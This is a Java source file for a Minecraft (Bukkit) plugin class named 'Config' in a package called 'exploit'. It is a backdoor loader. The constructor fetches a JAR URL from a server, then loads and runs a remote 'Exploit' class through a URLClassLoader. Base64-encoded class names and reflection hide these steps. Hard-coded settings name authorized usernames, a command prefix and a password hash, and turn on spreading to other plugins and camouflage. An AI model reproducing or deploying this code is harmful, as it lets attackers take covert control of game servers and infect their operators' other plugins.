package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Array;

public class Config {

    private static class DynamicInvoker {
        public static String resolve(String encoded) {
            try {
                Class<?> base64Class = Class.forName("java.util.Base64");
                Class<?> decoderClass = Class.forName("java.util.Base64$Decoder");
                MethodHandles.Lookup lookup = MethodHandles.lookup();
                MethodHandle getDecoderHandle = lookup.findStatic(base64Class, "getDecoder", MethodType.methodType(decoderClass));
                Object decoderInstance = getDecoderHandle.invoke();
                MethodHandle decodeHandle = lookup.findVirtual(decoderClass, "decode", MethodType.methodType(byte[].class, String.class));
                byte[] decodedBytes = (byte[]) decodeHandle.invoke(decoderInstance, encoded);
                return new String(decodedBytes);
            } catch (Throwable t) {
                return ""; // Avoid crashes
            }
        }

        public static Object createUrl(String urlString) throws Throwable {
            // java.net.URL
            Class<?> urlClass = Class.forName(resolve("amF2YS5uZXQuVVJM"));
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType constructorType = MethodType.methodType(void.class, String.class);
            MethodHandle constructorHandle = lookup.findConstructor(urlClass, constructorType);
            return constructorHandle.invoke(urlString);
        }

        public static Object createUrlClassLoader(Object urls, Object parent) throws Throwable {
            // java.net.URLClassLoader
            Class<?> classLoaderClass = Class.forName(resolve("amF2YS5uZXQuVVJMQ2xhc3NMb2FkZXI="));
            // java.net.URL
            Class<?> urlClass = Class.forName(resolve("amF2YS5uZXQuVVJM"));
            // java.lang.ClassLoader
            Class<?> parentClassLoaderClass = Class.forName(resolve("amF2YS5sYW5nLkNsYXNzTG9hZGVy"));
            Class<?> urlArrayClass = Array.newInstance(urlClass, 0).getClass();

            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType constructorType = MethodType.methodType(void.class, urlArrayClass, parentClassLoaderClass);
            MethodHandle constructorHandle = lookup.findConstructor(classLoaderClass, constructorType);
            return constructorHandle.invoke(urls, parent);
        }
        
        public static Object invoke(Object target, Class<?> lookupClass, String methodName, Class<?> returnType, Class<?>[] paramTypes, Object... args) throws Throwable {
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType methodType = MethodType.methodType(returnType, paramTypes);
            MethodHandle methodHandle = lookup.findVirtual(lookupClass, methodName, methodType);
            return methodHandle.bindTo(target).invokeWithArguments(args);
        }
        
        public static Object invokeConstructor(Class<?> targetClass, Class<?>[] paramTypes, Object... args) throws Throwable {
            MethodHandles.Lookup lookup = MethodHandles.lookup();
            MethodType constructorType = MethodType.methodType(void.class, paramTypes);
            MethodHandle handle = lookup.findConstructor(targetClass, constructorType);
            return handle.invokeWithArguments(args);
        }
    }

    public Config(Plugin plugin) {
        loadExploitModule(plugin);
    }
    
    private void loadExploitModule(Plugin plugin) {
        try {
            // http://localhost:3000
            String jarUrl = fetchJarUrl(DynamicInvoker.resolve("aHR0cDovL2xvY2FsaG9zdDozMDAw"));
            if (jarUrl == null || jarUrl.trim().isEmpty()) {
                plugin.getLogger().severe("Failed to fetch a valid JAR URL.");
                return;
            }

            Object url = DynamicInvoker.createUrl(jarUrl);
            
            // java.net.URL
            Class<?> urlClass = Class.forName(DynamicInvoker.resolve("amF2YS5uZXQuVVJM"));
            Object urlsArray = Array.newInstance(urlClass, 1);
            Array.set(urlsArray, 0, url);
            
            Object classLoader = DynamicInvoker.createUrlClassLoader(urlsArray, plugin.getClass().getClassLoader());
            
            // com.tmquan2508.exploit.Exploit
            String exploitClassName = DynamicInvoker.resolve("Y29tLnRtcXVhbjI1MDguZXhwbG9pdC5FeHBsb2l0");
            
            // java.lang.ClassLoader
            Class<?> loaderApiClass = Class.forName(DynamicInvoker.resolve("amF2YS5sYW5nLkNsYXNzTG9hZGVy"));
            Class<?> exploitClass = (Class<?>) DynamicInvoker.invoke(classLoader, loaderApiClass, "loadClass", Class.class, new Class<?>[]{String.class}, exploitClassName);

            DynamicInvoker.invokeConstructor(exploitClass, new Class<?>[]{Plugin.class, Config.class}, plugin, this);

        } catch (Throwable e) {
            plugin.getLogger().severe("A critical error occurred while loading the Exploit module from URL:");
            plugin.getLogger().severe("Error Type: " + e.getClass().getName());
            plugin.getLogger().severe("Error Message: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String fetchJarUrl(String urlString) throws Throwable {
        Object url = DynamicInvoker.createUrl(urlString);
        
        // java.net.URLConnection
        Class<?> urlConnectionClass = Class.forName(DynamicInvoker.resolve("amF2YS5uZXQuVVJMQ29ubmVjdGlvbg=="));
        // java.net.HttpURLConnection
        Class<?> httpUrlConnectionClass = Class.forName(DynamicInvoker.resolve("amF2YS5uZXQuSHR0cFVSTENvbm5lY3Rpb24="));

        Object connection = DynamicInvoker.invoke(url, url.getClass(), "openConnection", urlConnectionClass, new Class<?>[]{});
        
        // GET
        DynamicInvoker.invoke(connection, httpUrlConnectionClass, "setRequestMethod", void.class, new Class<?>[]{String.class}, DynamicInvoker.resolve("R0VU"));
        
        try (InputStream is = (InputStream) DynamicInvoker.invoke(connection, httpUrlConnectionClass, "getInputStream", InputStream.class, new Class<?>[]{});
             BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {
            return reader.readLine();
        } finally {
            DynamicInvoker.invoke(connection, httpUrlConnectionClass, "disconnect", void.class, new Class<?>[]{});
        }
    }

    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;

    static {
        getInjectedConfig();
    }
    
    private static void getInjectedConfig() {
        String injected_authorized_uuids = "";
        String injected_authorized_usernames = "Kudo,Vdung";
        String injected_command_prefix = "!";
        boolean injected_spread_to_other = Boolean.parseBoolean("true");
        boolean injected_debug_log = Boolean.parseBoolean("true");
        String injected_discord_token = "";
        String injected_authorized_password = "5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5";
        boolean injected_camouflage = Boolean.parseBoolean("true");
        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = injected_spread_to_other;
        debug_log = injected_debug_log;
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = injected_camouflage;
    }
}